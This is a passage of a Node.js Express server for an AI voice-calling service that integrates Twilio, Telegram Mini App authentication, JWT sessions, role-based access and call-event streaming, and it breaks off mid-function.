require("dotenv").config();
require("colors");

const express = require("express");
const fetch = require("node-fetch");
const ExpressWs = require("express-ws");
const path = require("path");
const crypto = require("crypto");
const rateLimit = require("express-rate-limit");

const { EnhancedGptService } = require("./routes/gpt");
const { StreamService } = require("./routes/stream");
const { TranscriptionService } = require("./routes/transcription");
const { TextToSpeechService } = require("./routes/tts");
const { recordingService } = require("./routes/recording");
const { EnhancedSmsService } = require("./routes/sms.js");
const { EmailService } = require("./routes/email");
const { createTwilioGatherHandler } = require("./routes/gather");
const Database = require("./db/db");
const { webhookService } = require("./routes/status");
const twilioSignature = require("./middleware/twilioSignature");
const DynamicFunctionEngine = require("./functions/DynamicFunctionEngine");
const { createDigitCollectionService } = require("./functions/Digit");
const { formatDigitCaptureLabel } = require("./functions/Labels");
const config = require("./config");
const {
  AwsConnectAdapter,
  AwsTtsAdapter,
  VonageVoiceAdapter,
} = require("./adapters");
const { v4: uuidv4 } = require("uuid");
const { WaveFile } = require("wavefile");

const isProduction = process.env.NODE_ENV === "production";
const appVersion = (() => {
  try {
    return (
      process.env.APP_VERSION ||
      process.env.VERCEL_GIT_COMMIT_SHA ||
      process.env.GIT_SHA ||
      require("./package.json").version ||
      "unknown"
    );
  } catch {
    return "unknown";
  }
})();

const twilio = require("twilio");
const VoiceResponse = twilio.twiml.VoiceResponse;

const DEFAULT_INBOUND_PROMPT =
  "You are an intelligent AI assistant capable of adapting to different business contexts and customer needs. Be professional, helpful, and responsive to customer communication styles. You must add a '•' symbol every 5 to 10 words at natural pauses where your response can be split for text to speech.";
const DEFAULT_INBOUND_FIRST_MESSAGE = "Hello! How can I assist you today?";
const INBOUND_DEFAULT_SETTING_KEY = "inbound_default_script_id";
const INBOUND_DEFAULT_CACHE_MS = 15000;
let inboundDefaultScriptId = null;
let inboundDefaultScript = null;
let inboundDefaultLoadedAt = 0;

const liveConsoleAudioTickMs = Number.isFinite(
  Number(config.liveConsole?.audioTickMs),
)
  ? Number(config.liveConsole?.audioTickMs)
  : 160;
const liveConsoleUserLevelThreshold = Number.isFinite(
  Number(config.liveConsole?.userLevelThreshold),
)
  ? Number(config.liveConsole?.userLevelThreshold)
  : 0.08;
const liveConsoleUserHoldMs = Number.isFinite(
  Number(config.liveConsole?.userHoldMs),
)
  ? Number(config.liveConsole?.userHoldMs)
  : 450;

// Console helpers with clean emoji prefixes (idempotent, minimal noise)
if (!console.__emojiWrapped) {
  const baseLog = console.log.bind(console);
  const baseWarn = console.warn.bind(console);
  const baseError = console.error.bind(console);
  console.log = (...args) => baseLog("📘", ...args);
  console.warn = (...args) => baseWarn("⚠️", ...args);
  console.error = (...args) => baseError("❌", ...args);
  console.__emojiWrapped = true;
}

const HMAC_HEADER_TIMESTAMP = "x-api-timestamp";
const HMAC_HEADER_SIGNATURE = "x-api-signature";
const HMAC_BYPASS_PATH_PREFIXES = [
  "/webhook/",
  "/incoming",
  "/aws/transcripts",
  "/connection",
  "/vonage/stream",
  "/aws/stream",
  "/miniapp",
  "/webapp",
];

let db;
let digitService;
const functionEngine = new DynamicFunctionEngine();
let smsService = new EnhancedSmsService();
let emailService;
const sttFallbackCalls = new Set();
const streamTimeoutCalls = new Set();
const inboundRateBuckets = new Map();
const streamStartTimes = new Map();
const sttFailureCounts = new Map();
const activeStreamConnections = new Map();
const streamStartSeen = new Map(); // callSid -> streamSid (dedupe starts)
const streamStopSeen = new Set(); // callSid:streamSid (dedupe stops)
const streamRetryState = new Map(); // callSid -> { attempts, nextDelayMs }
const streamAuthBypass = new Map(); // callSid -> { reason, at }
const streamStatusDedupe = new Map(); // callSid:streamSid:event -> ts
const callStatusDedupe = new Map(); // callSid:status:sequence:timestamp -> ts
const callLifecycle = new Map(); // callSid -> { status, updatedAt }
const streamLastMediaAt = new Map(); // callSid -> timestamp
const sttLastFrameAt = new Map(); // callSid -> timestamp
const streamWatchdogState = new Map(); // callSid -> { noMediaNotifiedAt, noMediaEscalatedAt, sttNotifiedAt }
const providerHealth = new Map();
let callJobProcessing = false;
const callLifecycleCleanupTimers = new Map();
const miniappClients = new Set(); // { res, token, userId }
const miniappEventBuffer = [];
let miniappSequence = 0;
const IDEMPOTENCY_TTL_MS = 5 * 60 * 1000;
const idempotencyCache = new Map(); // key -> { ts, status, body }

const MINIAPP_SESSION_TTL_MS = Number(
  config.miniapp?.sessionTtlMs || 60 * 60 * 1000,
);
const MINIAPP_REFRESH_TTL_MS = Number(
  config.miniapp?.refreshTtlMs || 7 * 24 * 60 * 60 * 1000,
);
const MINIAPP_EVENT_BUFFER_MAX = 500;
const MINIAPP_INITDATA_MAX_AGE_S = 24 * 60 * 60;
const MINIAPP_ACCESS_CACHE_TTL_MS = 30000;
const MINIAPP_ACCESS_ADMIN_KEY = "miniapp_admin_ids";
const MINIAPP_ACCESS_OPERATOR_KEY = "miniapp_operator_ids";
const MINIAPP_ACCESS_VIEWER_KEY = "miniapp_viewer_ids";
const miniappAccessCache = {
  admins: [],
  operators: [],
  viewers: [],
  loadedAt: 0,
};
const WEBAPP_JWT_TTL_S = Number(config.miniapp?.jwtTtlSeconds || 900);
const WEBAPP_INITDATA_MAX_AGE_S = Number(
  config.miniapp?.initDataMaxAgeS || 120,
);
const WEBAPP_INITDATA_CLOCK_SKEW_S = 60;
const WEBAPP_JWT_ISSUER = "voicdnut-webapp";
const WEBAPP_JWT_AUDIENCE = "voicednut-miniapp";
const WEBAPP_JWT_CLOCK_SKEW_S = 60;
const WEBAPP_ENVIRONMENT = String(
  process.env.APP_ENV || process.env.NODE_ENV || "production",
).toLowerCase();
const WEBAPP_TENANT_ID = String(
  config.miniapp?.tenantId || process.env.TENANT_ID || "default",
);
let backgroundWorkersStarted = false;

let testDbInitPromise = null;
const testMiniappSessions = new Map();

function installTestMiniappSessionStore(targetDb) {
  if (!targetDb || targetDb.__testMiniappSessions) return;
  targetDb.__testMiniappSessions = true;

  targetDb.createMiniappSession = async (session) => {
    if (!session?.session_token) return 0;
    testMiniappSessions.set(session.session_token, { ...session });
    if (session.refresh_token) {
      testMiniappSessions.set(`refresh:${session.refresh_token}`, {
        session_token: session.session_token,
      });
    }
    return 1;
  };

  targetDb.getMiniappSessionByToken = async (token) => {
    if (!token) return null;
    const session = testMiniappSessions.get(token);
    return session ? { ...session } : null;
  };

  targetDb.getMiniappSessionByRefresh = async (refreshToken) => {
    if (!refreshToken) return null;
    const ref = testMiniappSessions.get(`refresh:${refreshToken}`);
    if (!ref?.session_token) return null;
    const session = testMiniappSessions.get(ref.session_token);
    return session ? { ...session } : null;
  };

  targetDb.rotateMiniappSession = async (refreshToken, next) => {
    const existing = await targetDb.getMiniappSessionByRefresh(refreshToken);
    if (!existing) return 0;
    testMiniappSessions.delete(existing.session_token);
    testMiniappSessions.delete(`refresh:${refreshToken}`);
    const merged = { ...existing, ...next };
    testMiniappSessions.set(merged.session_token, merged);
    if (merged.refresh_token) {
      testMiniappSessions.set(`refresh:${merged.refresh_token}`, {
        session_token: merged.session_token,
      });
    }
    return 1;
  };

  targetDb.revokeMiniappSession = async (token) => {
    const existing = await targetDb.getMiniappSessionByToken(token);
    if (existing?.refresh_token) {
      testMiniappSessions.delete(`refresh:${existing.refresh_token}`);
    }
    return testMiniappSessions.delete(token) ? 1 : 0;
  };

  targetDb.updateMiniappSessionLastSeen = async (token, ip, userAgent) => {
    const existing = await targetDb.getMiniappSessionByToken(token);
    if (!existing) return 0;
    testMiniappSessions.set(token, {
      ...existing,
      ip: ip || existing.ip || null,
      user_agent: userAgent || existing.user_agent || null,
      last_seen_at: new Date().toISOString(),
    });
    return 1;
  };

  targetDb.logMiniappAudit = async () => {};
}

async function ensureTestDbReady() {
  if (db) return db;
  if (process.env.NODE_ENV !== "test") return null;
  if (!testDbInitPromise) {
    db = new Database();
    testDbInitPromise = db
      .initialize()
      .then(() => {
        installTestMiniappSessionStore(db);
        return db;
      })
      .catch((error) => {
        testDbInitPromise = null;
        throw error;
      });
  }
  return testDbInitPromise;
}

const CALL_STATUS_DEDUPE_MS = 3000;
const CALL_STATUS_DEDUPE_MAX = 5000;

function cleanupIdempotencyCache() {
  const now = Date.now();
  for (const [key, entry] of idempotencyCache.entries()) {
    if (!entry || now - entry.ts > IDEMPOTENCY_TTL_MS) {
      idempotencyCache.delete(key);
    }
  }
}

function getIdempotencyCacheKey(req) {
  const rawKey = req.headers["idempotency-key"];
  if (!rawKey) return null;
  const key = Array.isArray(rawKey) ? rawKey[0] : String(rawKey || "").trim();
  if (!key) return null;
  const userId = req.webappSession?.user?.id || req.user?.id || "anon";
  return `${req.method}:${req.path}:${userId}:${key}`;
}

function applyIdempotency(req, res) {
  const cacheKey = getIdempotencyCacheKey(req);
  if (!cacheKey) return { handled: false };
  const cached = idempotencyCache.get(cacheKey);
  if (cached && Date.now() - cached.ts <= IDEMPOTENCY_TTL_MS) {
    res.status(cached.status).json(cached.body);
    return { handled: true };
  }
  let statusCode = 200;
  const originalStatus = res.status.bind(res);
  res.status = (code) => {
    statusCode = code;
    return originalStatus(code);
  };
  const originalJson = res.json.bind(res);
  res.json = (body) => {
    if (statusCode >= 200 && statusCode < 300) {
      cleanupIdempotencyCache();
      idempotencyCache.set(cacheKey, {
        ts: Date.now(),
        status: statusCode,
        body,
      });
    }
    return originalJson(body);
  };
  return { handled: false };
}

function stableStringify(value) {
  if (value === null || typeof value !== "object") {
    return JSON.stringify(value);
  }
  if (Array.isArray(value)) {
    const items = value.map((item) =>
      item === undefined ? "null" : stableStringify(item),
    );
    return `[${items.join(",")}]`;
  }
  const keys = Object.keys(value)
    .filter((key) => value[key] !== undefined)
    .sort();
  const entries = keys.map(
    (key) => `${JSON.stringify(key)}:${stableStringify(value[key])}`,
  );
  return `{${entries.join(",")}}`;
}

function parseTelegramInitData(raw = "") {
  const params = new URLSearchParams(raw);
  const hash = params.get("hash");
  if (hash) {
    params.delete("hash");
  }
  const entries = [];
  params.forEach((value, key) => {
    entries.push([key, value]);
  });
  entries.sort((a, b) => a[0].localeCompare(b[0]));
  const dataCheckString = entries
    .map(([key, value]) => `${key}=${value}`)
    .join("\n");
  return { hash, dataCheckString, params };
}

function decodeBase64(value) {
  if (!value) return "";
  try {
    return Buffer.from(String(value), "base64").toString("utf8");
  } catch {
    return "";
  }
}

function resolveMiniappInitData(req) {
  const header =
    req.headers["x-telegram-init-data"] ||
    req.headers["x-telegram-initdata"] ||
    req.headers["x-telegram-init"];
  if (header) return String(header);
  const auth = String(req.headers.authorization || "");
  if (auth.toLowerCase().startsWith("tma ")) {
    return auth.slice(4).trim();
  }
  if (req.query?.init_b64) {
    const decoded = decodeBase64(req.query.init_b64);
    if (decoded) return decoded;
  }
  if (req.query?.init) return String(req.query.init);
  if (req.body?.initData) return String(req.body.initData);
  return "";
}

function resolveWebappInitDataFromAuth(req) {
  const auth = String(req.headers.authorization || "");
  if (auth.toLowerCase().startsWith("tma ")) {
    return auth.slice(4).trim();
  }
  return "";
}

function verifyTelegramInitData(
  raw,
  maxAgeSeconds = MINIAPP_INITDATA_MAX_AGE_S,
) {
  const botToken =
    config.telegram?.botToken ||
    process.env.TELEGRAM_BOT_TOKEN ||
    process.env.BOT_TOKEN;
  if (!botToken) {
    return { ok: false, reason: "missing_bot_token" };
  }
  const { hash, dataCheckString, params } = parseTelegramInitData(raw);
  if (!hash) {
    return { ok: false, reason: "missing_hash" };
  }
  const secret = crypto
    .createHmac("sha256", "WebAppData")
    .update(String(botToken))
    .digest();
  const computed = crypto
    .createHmac("sha256", secret)
    .update(dataCheckString)
    .digest("hex");
  const computedBuf = Buffer.from(computed, "hex");
  const hashBuf = Buffer.from(hash, "hex");
  if (computedBuf.length !== hashBuf.length) {
    return { ok: false, reason: "invalid_hash" };
  }
  if (!crypto.timingSafeEqual(computedBuf, hashBuf)) {
    return { ok: false, reason: "invalid_hash" };
  }
  const authDateRaw = params.get("auth_date");
  const authDate = Number(authDateRaw);
  if (Number.isFinite(authDate) && maxAgeSeconds > 0) {
    const ageSeconds = Math.floor(Date.now() / 1000) - authDate;
    if (ageSeconds > maxAgeSeconds + WEBAPP_INITDATA_CLOCK_SKEW_S) {
      return { ok: false, reason: "expired_init_data" };
    }
    if (ageSeconds < -WEBAPP_INITDATA_CLOCK_SKEW_S) {
      return { ok: false, reason: "invalid_auth_date" };
    }
  }
  let user = null;
  const userRaw = params.get("user");
  if (userRaw) {
    try {
      user = JSON.parse(userRaw);
    } catch {
      user = null;
    }
  }
  return { ok: true, user, params };
}

function requireMiniappInitData(req, res, next) {
  const raw = resolveMiniappInitData(req);
  if (!raw) {
    return res.status(401).json({ ok: false, error: "missing_initdata" });
  }
  const verified = verifyTelegramInitData(raw);
  if (!verified.ok) {
    return res
      .status(401)
      .json({ ok: false, error: verified.reason || "invalid_initdata" });
  }
  req.miniappInitData = raw;
  req.miniappInitUser = verified.user;
  req.miniappInitParams = verified.params;
  return next();
}

function parseAccessList(rawValue) {
  if (!rawValue) return [];
  if (Array.isArray(rawValue)) {
    return rawValue
      .map((value) => String(value).trim())
      .map((value) => value.replace(/[^\d]/g, ""))
      .filter((value) => value.length >= 5);
  }
  const raw = String(rawValue).trim();
  if (!raw) return [];
  try {
    const parsed = JSON.parse(raw);
    if (Array.isArray(parsed)) {
      return parsed
        .map((value) => String(value).trim())
        .map((value) => value.replace(/[^\d]/g, ""))
        .filter((value) => value.length >= 5);
    }
  } catch (_) {
    // fall through
  }
  return raw
    .split(",")
    .map((value) => value.trim())
    .map((value) => value.replace(/[^\d]/g, ""))
    .filter((value) => value.length >= 5);
}

function mergeAccessLists(base = [], extra = []) {
  const merged = new Set();
  base.forEach((value) => merged.add(String(value)));
  extra.forEach((value) => merged.add(String(value)));
  return Array.from(merged);
}

async function loadMiniappAccessCache(force = false) {
  const now = Date.now();
  if (
    !force &&
    now - miniappAccessCache.loadedAt < MINIAPP_ACCESS_CACHE_TTL_MS
  ) {
    return miniappAccessCache;
  }
  try {
    const [adminsRaw, operatorsRaw, viewersRaw] = await Promise.all([
      db.getSetting(MINIAPP_ACCESS_ADMIN_KEY).catch(() => null),
      db.getSetting(MINIAPP_ACCESS_OPERATOR_KEY).catch(() => null),
      db.getSetting(MINIAPP_ACCESS_VIEWER_KEY).catch(() => null),
    ]);
    miniappAccessCache.admins = parseAccessList(adminsRaw);
    miniappAccessCache.operators = parseAccessList(operatorsRaw);
    miniappAccessCache.viewers = parseAccessList(viewersRaw);
    miniappAccessCache.loadedAt = now;
  } catch (error) {
    console.error("Failed to load miniapp access cache:", error);
  }
  return miniappAccessCache;
}

async function getMiniappAccessLists() {
  // Prefer user IDs over chat IDs for Mini App access control
  const envAdmins = config.telegram?.adminUserIds?.length
    ? config.telegram.adminUserIds
    : config.telegram?.adminChatIds || [];
  const envOperators = config.telegram?.operatorUserIds?.length
    ? config.telegram.operatorUserIds
    : config.telegram?.operatorChatIds || [];
  const envViewers = config.telegram?.viewerUserIds?.length
    ? config.telegram.viewerUserIds
    : config.telegram?.viewerChatIds || [];

  if (!db) {
    return {
      envAdmins,
      envOperators,
      envViewers,
      customAdmins: [],
      customOperators: [],
      customViewers: [],
      admins: envAdmins,
      operators: envOperators,
      viewers: envViewers,
    };
  }
  const cache = await loadMiniappAccessCache();
  const admins = mergeAccessLists(envAdmins, cache.admins);
  const operators = mergeAccessLists(envOperators, cache.operators);
  const viewers = mergeAccessLists(envViewers, cache.viewers);
  return {
    envAdmins,
    envOperators,
    envViewers,
    customAdmins: cache.admins,
    customOperators: cache.operators,
    customViewers: cache.viewers,
    admins,
    operators,
    viewers,
  };
}

async function resolveMiniappRoles(userId) {
  const { admins, operators, viewers } = await getMiniappAccessLists();
  const id = String(userId || "");
  const adminOverride =
    String(process.env.ADMIN_TELEGRAM_ID || config.telegram?.adminChatId || "");
  if (!admins.length && !operators.length && !viewers.length && !isProduction) {
    return ["admin"];
  }
  if (adminOverride && id === String(adminOverride)) return ["admin"];
  if (admins.map(String).includes(id)) return ["admin"];
  if (operators.map(String).includes(id)) return ["operator"];
  if (viewers.map(String).includes(id)) return ["operator"];
  return [];
}

async function isMiniappUserAllowed(userId) {
  const roles = await resolveMiniappRoles(userId);
  return roles.length > 0;
}

function resolveMiniappOrigin(req) {
  const origin = req.headers.origin || "";
  return String(origin || "").trim();
}

function isMiniappOriginAllowed(origin) {
  const allowlist = config.miniapp?.allowedOrigins || [];
  if (!origin) {
    if (isProduction) return false;
    return !allowlist.length;
  }
  if (!origin.startsWith("https://")) {
    return !isProduction;
  }
  if (!allowlist.length) {
    return !isProduction;
  }
  return allowlist.includes(origin);
}

function requireMiniappOrigin(req, res, next) {
  const origin = resolveMiniappOrigin(req);
  if (!isMiniappOriginAllowed(origin)) {
    return res.status(403).json({
      ok: false,
      error: "origin_not_allowed",
      message: webappErrorMessage("origin_not_allowed"),
    });
  }
  return next();
}

async function createMiniappSession(user = null, req = null) {
  if (!db) {
    await ensureTestDbReady();
  }
  if (!db) {
    throw new Error("Database not initialized");
  }
  const token = crypto.randomBytes(24).toString("hex");
  const refreshToken = crypto.randomBytes(32).toString("hex");
  const now = Date.now();
  const roles = await resolveMiniappRoles(user?.id);
  const session = {
    session_token: token,
    refresh_token: refreshToken,
    user_id: String(user?.id || ""),
    username: user?.username || null,
    first_name: user?.first_name || null,
    last_name: user?.last_name || null,
    roles,
    expires_at: new Date(now + MINIAPP_SESSION_TTL_MS).toISOString(),
    refresh_expires_at: new Date(now + MINIAPP_REFRESH_TTL_MS).toISOString(),
    ip: req?.ip || null,
    user_agent: req?.headers?.["user-agent"] || null,
  };
  await db.createMiniappSession(session);
  return { ...session, token };
}

function resolveMiniappToken(req) {
  const header = req.headers.authorization || "";
  if (header.startsWith("Bearer ")) {
    return header.slice("Bearer ".length).trim();
  }
  const direct = req.headers["x-miniapp-token"];
  if (direct) return String(direct);
  const queryToken = req.query?.token || req.query?.session;
  if (queryToken) {
    const path = req.path || req.originalUrl || "";
    if (path.startsWith("/miniapp/stream")) {
      return String(queryToken);
    }
  }
  return null;
}

function resolveMiniappRefreshToken(req) {
  const header = req.headers.authorization || "";
  if (header.startsWith("Bearer ")) {
    return header.slice("Bearer ".length).trim();
  }
  const direct = req.headers["x-miniapp-refresh"];
  if (direct) return String(direct);
  const bodyToken = req.body?.refresh_token;
  if (bodyToken) return String(bodyToken);
  return null;
}

async function requireMiniappSession(req, res, next) {
  try {
    if (!db) {
      await ensureTestDbReady();
    }
    if (!db) {
      return res.status(500).json({ ok: false, error: "db_unavailable" });
    }
    const token = resolveMiniappToken(req);
    if (!token) {
      return res.status(401).json({ ok: false, error: "missing_session" });
    }
    const session = await db.getMiniappSessionByToken(token);
    if (!session) {
      return res.status(401).json({ ok: false, error: "invalid_session" });
    }
    const expiresAt = session.expires_at
      ? Date.parse(session.expires_at)
      : null;
    if (expiresAt && Date.now() > expiresAt) {
      await db.revokeMiniappSession(token).catch(() => {});
      return res.status(401).json({ ok: false, error: "session_expired" });
    }
    const roles = await resolveMiniappRoles(session.user_id);
    if (!roles.length) {
      await db.revokeMiniappSession(token).catch(() => {});
      return res.status(403).json({ ok: false, error: "not_authorized" });
    }
    if (
      req.miniappInitUser?.id &&
      String(req.miniappInitUser.id) !== String(session.user_id)
    ) {
      return res.status(403).json({ ok: false, error: "user_mismatch" });
    }
    req.miniappSession = {
      token,
      user: {
        id: session.user_id,
        username: session.username,
        first_name: session.first_name,
        last_name: session.last_name,
      },
      roles,
    };
    db.updateMiniappSessionLastSeen(
      token,
      req.ip,
      req.headers["user-agent"],
    ).catch(() => {});
    return next();
  } catch (error) {
    console.error("Miniapp session error:", error);
    return res.status(500).json({ ok: false, error: "session_error" });
  }
}

function requireMiniappAdmin(req, res, next) {
  const session = req.miniappSession;
  if (!session?.user?.id) {
    return res.status(401).json({ ok: false, error: "missing_user" });
  }
  const roles = session.roles || [];
  if (!roles.includes("admin")) {
    return res.status(403).json({ ok: false, error: "not_authorized" });
  }
  return next();
}

function base64UrlEncode(input) {
  return Buffer.from(input)
    .toString("base64")
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

function base64UrlDecode(input) {
  if (!input) return "";
  const normalized = String(input).replace(/-/g, "+").replace(/_/g, "/");
  const padded = normalized.padEnd(
    normalized.length + (4 - (normalized.length % 4 || 4)),
    "=",
  );
  return Buffer.from(padded, "base64").toString("utf8");
}

function getWebappJwtSecret() {
  const secret = config.miniapp?.jwtSecret;
  if (!secret) {
    console.warn(
      "Miniapp JWT secret is missing. Set WEB_APP_SECRET or MINIAPP_JWT_SECRET.",
    );
  }
  return secret;
}

function createWebappTokenId() {
  if (typeof crypto.randomUUID === "function") {
    return crypto.randomUUID();
  }
  return crypto.randomBytes(16).toString("hex");
}

function signWebappJwt(payload = {}) {
  const secret = getWebappJwtSecret();
  if (!secret) return null;
  const header = { alg: "HS256", typ: "JWT" };
  const encodedHeader = base64UrlEncode(JSON.stringify(header));
  const encodedPayload = base64UrlEncode(JSON.stringify(payload));
  const data = `${encodedHeader}.${encodedPayload}`;
  const signature = crypto
    .createHmac("sha256", secret)
    .update(data)
    .digest("base64");
  const encodedSignature = signature
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
  return `${data}.${encodedSignature}`;
}

function verifyWebappJwt(token) {
  const secret = getWebappJwtSecret();
  if (!secret) return { ok: false, error: "missing_secret" };
  const parts = String(token || "").split(".");
  if (parts.length !== 3) return { ok: false, error: "invalid_token" };
  const [encodedHeader, encodedPayload, encodedSignature] = parts;
  const data = `${encodedHeader}.${encodedPayload}`;
  const expected = crypto
    .createHmac("sha256", secret)
    .update(data)
    .digest("base64");
  const expectedNormalized = expected
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
  const expectedBuf = Buffer.from(expectedNormalized);
  const actualBuf = Buffer.from(encodedSignature);
  if (
    expectedBuf.length !== actualBuf.length ||
    !crypto.timingSafeEqual(expectedBuf, actualBuf)
  ) {
    return { ok: false, error: "invalid_signature" };
  }
  try {
    const payloadRaw = base64UrlDecode(encodedPayload);
    const payload = JSON.parse(payloadRaw);
    const now = Math.floor(Date.now() / 1000);
    if (!payload.iss) {
      return { ok: false, error: "missing_issuer" };
    }
    if (payload.iss && payload.iss !== WEBAPP_JWT_ISSUER) {
      return { ok: false, error: "invalid_issuer" };
    }
    if (!payload.aud) {
      return { ok: false, error: "missing_audience" };
    }
    if (payload.aud && payload.aud !== WEBAPP_JWT_AUDIENCE) {
      return { ok: false, error: "invalid_audience" };
    }
    if (payload.nbf && now + WEBAPP_JWT_CLOCK_SKEW_S < payload.nbf) {
      return { ok: false, error: "token_not_active" };
    }
    if (payload.iat && payload.iat - now > WEBAPP_JWT_CLOCK_SKEW_S) {
      return { ok: false, error: "invalid_issued_at" };
    }
    if (payload.exp === undefined || payload.exp === null) {
      return { ok: false, error: "missing_exp" };
    }
    const exp = Number(payload.exp);
    if (!Number.isFinite(exp)) {
      return { ok: false, error: "invalid_exp" };
    }
    if (now >= exp) {
      return { ok: false, error: "token_expired" };
    }
    return { ok: true, payload };
  } catch (error) {
    return { ok: false, error: "invalid_payload" };
  }
}

function resolveWebappToken(req) {
  const header = req.headers.authorization || "";
  if (header.startsWith("Bearer ")) {
    return header.slice("Bearer ".length).trim();
  }
  const direct = req.headers["x-webapp-token"];
  if (direct) return String(direct);
  const queryToken = req.query?.token || req.query?.session;
  if (queryToken) {
    const path = req.path || req.originalUrl || "";
    if (path.startsWith("/webapp/sse")) {
      return String(queryToken);
    }
  }
  return null;
}

function webappErrorMessage(code) {
  const messages = {
    missing_initdata:
      "Telegram init data is missing. Open the Mini App from Telegram.",
    missing_hash: "Telegram init data hash is missing.",
    invalid_hash: "Telegram init data signature is invalid.",
    expired_init_data:
      "Telegram init data expired. Close and reopen the Mini App.",
    invalid_auth_date: "Telegram init data has an invalid timestamp.",
    missing_bot_token:
      "Server is missing the bot token for initData verification.",
    invalid_initdata: "Telegram init data is invalid.",
    missing_user: "Telegram user payload is missing.",
    not_authorized: "User is not authorized for this Mini App.",
    missing_token: "Auth token is missing.",
    missing_issuer: "Auth token is missing an issuer.",
    missing_audience: "Auth token is missing an audience.",
    missing_exp: "Auth token is missing an expiry.",
    invalid_exp: "Auth token expiry is invalid.",
    invalid_token: "Auth token is invalid or expired.",
    origin_not_allowed: "Origin not allowed for this Mini App.",
  };
  return messages[code] || "Request failed";
}

function requireWebappInitData(req, res, next) {
  const raw = resolveMiniappInitData(req);
  if (!raw) {
    return res.status(401).json({
      ok: false,
      error: "missing_initdata",
      message: webappErrorMessage("missing_initdata"),
    });
  }
  const verified = verifyTelegramInitData(raw, WEBAPP_INITDATA_MAX_AGE_S);
  if (!verified.ok) {
    const code = verified.reason || "invalid_initdata";
    return res.status(401).json({
      ok: false,
      error: code,
      message: webappErrorMessage(code),
    });
  }
  req.miniappInitData = raw;
  req.miniappInitUser = verified.user;
  req.miniappInitParams = verified.params;
  return next();
}

function requireWebappTmaAuth(req, res, next) {
  const raw = resolveWebappInitDataFromAuth(req);
  if (!raw) {
    return res.status(401).json({
      ok: false,
      error: "missing_initdata",
      message: webappErrorMessage("missing_initdata"),
    });
  }
  const verified = verifyTelegramInitData(raw, WEBAPP_INITDATA_MAX_AGE_S);
  if (!verified.ok) {
    const code = verified.reason || "invalid_initdata";
    return res.status(401).json({
      ok: false,
      error: code,
      message: webappErrorMessage(code),
    });
  }
  req.miniappInitData = raw;
  req.miniappInitUser = verified.user;
  req.miniappInitParams = verified.params;
  return next();
}

function isJwtToken(token) {
  if (!token) return false;
  return String(token).split(".").length === 3;
}

async function resolveWebappSession(req) {
  const token = resolveWebappToken(req);
  if (!token) {
    return { ok: false, status: 401, error: "missing_token" };
  }
  const verification = verifyWebappJwt(token);
  if (!verification.ok) {
    return {
      ok: false,
      status: 401,
      error: verification.error || "invalid_token",
    };
  }
  const payload = verification.payload || {};
  const userId = payload.sub || payload.user_id || payload.userId;
  if (!userId) {
    return { ok: false, status: 401, error: "missing_user" };
  }
  const roles = await resolveMiniappRoles(userId);
  if (!roles.length) {
    return { ok: false, status: 403, error: "not_authorized" };
  }
  return {
    ok: true,
    session: {
      token,
      user: {
        id: String(userId),
        username: payload.username || null,
        first_name: payload.first_name || null,
        last_name: payload.last_name || null,
      },
      roles,
      tenant_id: payload.tenant_id || WEBAPP_TENANT_ID,
    },
  };
}

async function requireWebappJwt(req, res, next) {
  try {
    const resolved = await resolveWebappSession(req);
    if (!resolved.ok) {
      return res.status(resolved.status || 401).json({
        ok: false,
        error: resolved.error,
        message: webappErrorMessage(resolved.error),
      });
    }
    req.webappSession = resolved.session;
    return next();
  } catch (error) {
    console.error("Webapp auth error:", error);
    return res.status(500).json({ ok: false, error: "auth_error" });
  }
}

async function requireMiniappAccessAdmin(req, res, next) {
  try {
    const token = resolveWebappToken(req);
    if (token && isJwtToken(token)) {
      const resolved = await resolveWebappSession(req);
      if (!resolved.ok) {
        return res.status(resolved.status || 401).json({
          ok: false,
          error: resolved.error,
          message: webappErrorMessage(resolved.error),
        });
      }
      const roles = resolved.session?.roles || [];
      if (!roles.includes("admin")) {
        return res.status(403).json({
          ok: false,
          error: "not_authorized",
          message: webappErrorMessage("not_authorized"),
        });
      }
      req.webappSession = resolved.session;
      req.miniappSession = {
        token: resolved.session.token,
        user: resolved.session.user,
        roles: resolved.session.roles,
      };
      return next();
    }
    return requireMiniappSession(req, res, () =>
      requireMiniappAdmin(req, res, next),
    );
  } catch (error) {
    console.error("Miniapp access auth error:", error);
    return res.status(500).json({ ok: false, error: "auth_error" });
  }
}

function requireWebappAdmin(req, res, next) {
  const session = req.webappSession;
  if (!session?.user?.id) {
    return res.status(401).json({ ok: false, error: "missing_user" });
  }
  const roles = session.roles || [];
  if (!roles.includes("admin")) {
    return res.status(403).json({ ok: false, error: "not_authorized" });
  }
  return next();
}

function pushMiniappEvent(event) {
  if (!event) return;
  miniappEventBuffer.push(event);
  if (miniappEventBuffer.length > MINIAPP_EVENT_BUFFER_MAX) {
    miniappEventBuffer.splice(
      0,
      miniappEventBuffer.length - MINIAPP_EVENT_BUFFER_MAX,
    );
  }
  const payload = `data: ${JSON.stringify(event)}\n\n`;
  for (const client of miniappClients) {
    try {
      client.res.write(payload);
    } catch {
      // ignore broken clients
    }
  }
}

function emitMiniappEvent(type, callSid, data = {}) {
  if (!type || !callSid) return null;
  const ts = new Date().toISOString();
  const event = {
    sequence: ++miniappSequence,
    type,
    call_sid: callSid,
    data,
    ts,
  };
  pushMiniappEvent(event);

  if (type === "call.status") {
    pushMiniappEvent({
      sequence: ++miniappSequence,
      type: "call.updated",
      call_sid: callSid,
      data,
      ts,
    });
    if (isTerminalStatusKey(data?.status)) {
      pushMiniappEvent({
        sequence: ++miniappSequence,
        type: "call.ended",
        call_sid: callSid,
        data,
        ts,
      });
    }
  }

  if (type === "call.inbound_gate" && data?.status === "pending") {
    pushMiniappEvent({
      sequence: ++miniappSequence,
      type: "inbound.ringing",
      call_sid: callSid,
      data,
      ts,
    });
  }

  if (type === "call.phase") {
    pushMiniappEvent({
      sequence: ++miniappSequence,
      type: "stream.health",
      call_sid: callSid,
      data,
      ts,
    });
  }

  return event;
}

function purgeStreamStatusDedupe(callSid) {
  if (!callSid) return;
  const prefix = `${callSid}:`;
  for (const key of streamStatusDedupe.keys()) {
    if (key.startsWith(prefix)) {
      streamStatusDedupe.delete(key);
    }
  }
}

function pruneDedupeMap(map, maxSize) {
  if (map.size <= maxSize) return;
  const entries = [...map.entries()].sort((a, b) => a[1] - b[1]);
  const overflow = entries.length - maxSize;
  for (let i = 0; i < overflow; i += 1) {
    map.delete(entries[i][0]);
  }
}

function buildCallStatusDedupeKey(payload = {}) {
